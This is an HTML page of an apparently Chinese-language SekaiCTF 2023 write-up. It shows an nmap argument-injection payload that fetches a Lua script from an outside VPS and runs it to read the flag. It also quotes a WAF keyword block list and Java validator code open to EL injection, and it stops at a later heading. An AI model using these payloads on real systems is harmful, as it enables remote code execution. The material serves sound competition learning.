@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"gudiffany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="2023sekaiCTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023sekaiCTF">
+<meta property="og:url" content="https://gudiffany.github.io/2023/09/04/10-26-47/index.html">
+<meta property="og:site_name" content="diffany">
+<meta property="og:description" content="2023sekaiCTF">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230904110025886.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230904110309274.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230904111134085.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/flag.png">
+<meta property="article:published_time" content="2023-09-04T02:26:47.000Z">
+<meta property="article:modified_time" content="2023-09-07T15:21:02.352Z">
+<meta property="article:author" content="diffany">
+<meta property="article:tag" content="2023ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gudiffany.github.io/img/image-20230904110025886.png">
+
+
+<link rel="canonical" href="https://gudiffany.github.io/2023/09/04/10-26-47/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://gudiffany.github.io/2023/09/04/10-26-47/","path":"2023/09/04/10-26-47/","title":"2023sekaiCTF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023sekaiCTF | diffany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">diffany</p>
+      <i class="logo-line"></i>
+    </a>
+      <img class="custom-logo-image" src="/uploads/custom-logo.png" alt="diffany">
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友情链接"><a href="/friend/" rel="section"><i class="fa fa-sitemap fa-fw"></i>友情链接</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">2023sekaiCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Scanner-Service"><span class="nav-number">1.1.1.</span> <span class="nav-text">Scanner Service</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Frog-WAF"><span class="nav-number">1.1.2.</span> <span class="nav-text">Frog-WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">任意数字构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">任意字符构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E6%9E%84%E9%80%A0"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">任意方法构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chunky"><span class="nav-number">1.1.3.</span> <span class="nav-text">chunky</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%99%E4%B8%8B%E4%B8%A4%E9%A2%98%E5%BE%85%E5%AE%9A%EF%BC%88%E4%B8%8D%E4%BC%9AX%EF%BC%8C%E5%90%8E%E7%BB%AD%E8%A6%81%E5%AD%A6%E4%B8%80%E4%B8%8B%EF%BC%89"><span class="nav-number">1.1.4.</span> <span class="nav-text">余下两题待定（不会X，后续要学一下）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PPC"><span class="nav-number">1.2.</span> <span class="nav-text">PPC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#wiki-game"><span class="nav-number">1.2.1.</span> <span class="nav-text">wiki_game</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-number">1.3.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Azusawa%E2%80%99s-Gacha-World"><span class="nav-number">1.3.1.</span> <span class="nav-text">Azusawa’s Gacha World</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forensics"><span class="nav-number">1.4.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Eval-Me"><span class="nav-number">1.4.1.</span> <span class="nav-text">Eval Me</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">diffany</p>
+  <div class="site-description" itemprop="description">一个努力学习的菜鸟</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://unpkg.com/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/09/04/10-26-47/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="diffany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diffany">
+      <meta itemprop="description" content="一个努力学习的菜鸟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023sekaiCTF | diffany">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023sekaiCTF<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/_posts/2023sekaiCTF.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pen-nib"></i></a>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-09-04 10:26:47" itemprop="dateCreated datePublished" datetime="2023-09-04T10:26:47+08:00">2023-09-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-09-07 23:21:02" itemprop="dateModified" datetime="2023-09-07T23:21:02+08:00">2023-09-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/2023wp/" itemprop="url" rel="index"><span itemprop="name">2023wp</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2023/09/04/10-26-47/" class="post-meta-item leancloud_visitors" data-flag-title="2023sekaiCTF" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1>2023sekaiCTF</h1>
+<span id="more"></span>
+<h2 id="web">web</h2>
+<h3 id="Scanner-Service">Scanner Service</h3>
+<p>对于这道题目，是Ruby，然后审计了一下代码</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">valid_port?</span>(<span class="params">input</span>)</span><br><span class="line">  !input.<span class="literal">nil</span>? <span class="keyword">and</span> (<span class="number">1</span>..<span class="number">65535</span>).cover?(input.to_i)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_ip?</span>(<span class="params">input</span>)</span><br><span class="line">  pattern = <span class="regexp">/\A((25[0-5]|2[0-4]\d|[01]?\d&#123;1,2&#125;)\.)&#123;3&#125;(25[0-5]|2[0-4]\d|[01]?\d&#123;1,2&#125;)\z/</span></span><br><span class="line">  !input.<span class="literal">nil</span>? <span class="keyword">and</span> !!(input =~ pattern)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chatgpt code :-)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_shell_input</span>(<span class="params">input_string</span>)</span><br><span class="line">  escaped_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  input_string.each_char <span class="keyword">do</span> |<span class="params">c</span>|</span><br><span class="line">    <span class="keyword">case</span> c</span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\ &#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;$&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\$&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;`&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\`&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\&quot;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;\\&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;|&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\|&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\&amp;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\&lt;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;(&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\(&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;)&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\)&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\n&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\*&#x27;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      escaped_string &lt;&lt; c</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  escaped_string</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在此处的ip使用了正则，没有漏洞，但是port只是简单的使用了数字判断端口，所以在ruby中只要开头的数字符合就可以</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts valid_port?(<span class="string">&quot;92aa&quot;</span>);</span><br><span class="line"><span class="regexp">//</span><span class="title class_">True</span></span><br></pre></td></tr></table></figure>
+<p>然后对输入的命令进行了过滤，基本上我想不到什么方法对其进行命令注入，但是放入的命令会用于nmap的命令执行，那么就可以根据nmap的选项进行注入操作，可以根据<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a>  之中存在的一个file download对其进行木马的注入</p>
+<p><img src="/img/image-20230904110025886.png" alt="image-20230904110025886" /></p>
+<p>开启vps的80端口，在下面放入需要执行的脚本poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.execute(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>然后抓包，将文件传入(利用tab过掉空格)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service=43.139.154.219%3A80%09--script%09http-fetch%09--script-args%09http-fetch.destination=/tmp,http-fetch.url=poc</span><br></pre></td></tr></table></figure>
+<p><img src="/img/image-20230904110309274.png" alt="image-20230904110309274" /></p>
+<p>即可发现存在访问</p>
+<p>进入容器去查看文件位置</p>
+<p><img src="/img/image-20230904111134085.png" alt="image-20230904111134085" /></p>
+<p>然后执行脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service=43.139.154.219%3A80%09--script%09/tmp/43.139.154.219/80/poc</span><br></pre></td></tr></table></figure>
+<p>补充：</p>
+<p>nmap的–script的扩展脚本是lua语言，所以使用的是lua的命令执行</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">os</span>.<span class="built_in">execute</span>(cmd)</span><br></pre></td></tr></table></figure>
+<h3 id="Frog-WAF">Frog-WAF</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sekai.app.waf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">AttackTypes</span> &#123;</span><br><span class="line">    SQLI(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;#&quot;</span>),</span><br><span class="line">    XSS(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>),</span><br><span class="line">    OS_INJECTION(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;*&quot;</span>),</span><br><span class="line">    CODE_INJECTION(<span class="string">&quot;for&quot;</span>, <span class="string">&quot;while&quot;</span>, <span class="string">&quot;goto&quot;</span>, <span class="string">&quot;if&quot;</span>),</span><br><span class="line">    JAVA_INJECTION(<span class="string">&quot;Runtime&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;java&quot;</span>, <span class="string">&quot;Name&quot;</span>, <span class="string">&quot;char&quot;</span>, <span class="string">&quot;Process&quot;</span>, <span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;Char&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;false&quot;</span>),</span><br><span class="line">    IDK(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String[] attackStrings;</span><br><span class="line"></span><br><span class="line">    AttackTypes(String... attackStrings) &#123;</span><br><span class="line">        <span class="built_in">this</span>.attackStrings = attackStrings;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对输入进行了检测，过滤了运算符号和数字以及java的敏感类</p>
+<p>赛后复现的时候，对各位大佬的blog以及官方wp进行学习</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py">https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py</a></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.luelueking.com/archives/1693226708524">http://www.luelueking.com/archives/1693226708524</a></p>
+<p>算是一个扫盲，学习了一下EL注入手法以及任意字符的构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sekai.app.controller.contact;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sekai.app.waf.FrogWaf;</span><br><span class="line"><span class="keyword">import</span> lombok.SneakyThrows;</span><br><span class="line"><span class="keyword">import</span> lombok.val;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StreamUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.ConstraintValidator;</span><br><span class="line"><span class="keyword">import</span> javax.validation.ConstraintValidatorContext;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.AccessDeniedException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountryValidator</span> <span class="keyword">implements</span> <span class="title class_">ConstraintValidator</span>&lt;CheckCountry, String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SneakyThrows</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(<span class="keyword">final</span> String input, <span class="keyword">final</span> ConstraintValidatorContext constraintContext)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">val</span> <span class="variable">v</span> <span class="operator">=</span> FrogWaf.getViolationByString(input);</span><br><span class="line">        <span class="keyword">if</span> (v.isPresent()) &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">msg</span> <span class="operator">=</span> String.format(<span class="string">&quot;Malicious input found: %s&quot;</span>, v);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedException</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">val</span> <span class="variable">countries</span> <span class="operator">=</span> StreamUtils.copyToString(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;countries&quot;</span>).getInputStream(), Charset.defaultCharset()).split(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="type">val</span> <span class="variable">isValid</span> <span class="operator">=</span> Arrays.asList(countries).contains(input);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!isValid) &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">message</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s is not a valid country&quot;</span>, input);</span><br><span class="line">            constraintContext.disableDefaultConstraintViolation();</span><br><span class="line">            constraintContext.buildConstraintViolationWithTemplate(message)</span><br><span class="line">                    .addConstraintViolation();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isValid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StreamUtils.copyToString(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;countries&quot;</span>).getInputStream(), Charset.defaultCharset()).split(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>存在EL表达式的注入，<code>（后面进行调试，现在暂时看不懂）</code></p>
+<h4 id="任意数字构造">任意数字构造</h4>
